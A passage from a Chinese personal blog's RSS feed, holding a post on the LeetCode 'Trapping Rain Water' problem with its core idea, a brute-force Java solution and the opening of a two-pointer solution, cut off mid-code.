                                    <category domain="https://xuoneyuan.github.io/categories/%E6%84%9F%E6%83%B3/">感想</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E6%97%A5%E5%B8%B8/">日常</category>
                                
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E7%94%9F%E6%B4%BB/">生活</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>接雨水</title>
                <link>https://xuoneyuan.github.io/posts/2/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/2/</guid>
                <pubDate>Thu, 09 Nov 2023 20:21:59 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;嗨害嗨，我接雨水又来了嗷，为什么三番五次的讲这个题目呢？因为这题实在是太经典了，好的题目无论做多少遍都是值得的，常做常新的。&lt;/p&gt;
&lt;p&gt;先看题目，废话不多说，家人们，上&lt;a href=&#34;https://leetcode.cn/problems/trapping-rain-water/description/&#34;&gt;链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/jieyushui.png&#34; alt=&#34;jieyushui.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;核心思路&#34;&gt;核心思路&lt;/h2&gt;
&lt;p&gt;对于此题从局部到整体，比如位置i，装水大小取决于左右两边最高柱子的最小值，分别称这两个柱子高度为l_max和r_max；位置 i 最大的水柱高度就是min(l_max, r_max)&lt;/p&gt;
&lt;p&gt;代码实现&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;water&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;左边最高的柱子&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;右边最高的柱子&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;..&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;end&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;一个简单的暴力解法&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;trap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 找右边最高的柱子&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 找左边最高的柱子&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// 如果自己就是最高的话，&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// l_max == r_max == height[i]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;        &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Math&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;min&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;双指针&#34;&gt;双指针&lt;/h2&gt;
&lt;p&gt;我们用双指针边走边算，节省下空间复杂度，这个问题要这么思考，我们只在乎min(l_max, r_max)。我们已经知道l_max &amp;lt; r_max了，至于这个r_max是不是右边最大的，不重要，重要的是height[i]能够装的水只和较低的l_max之差有关&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;trap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;left&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;height&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;length&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;    &lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;l_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r_max&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;
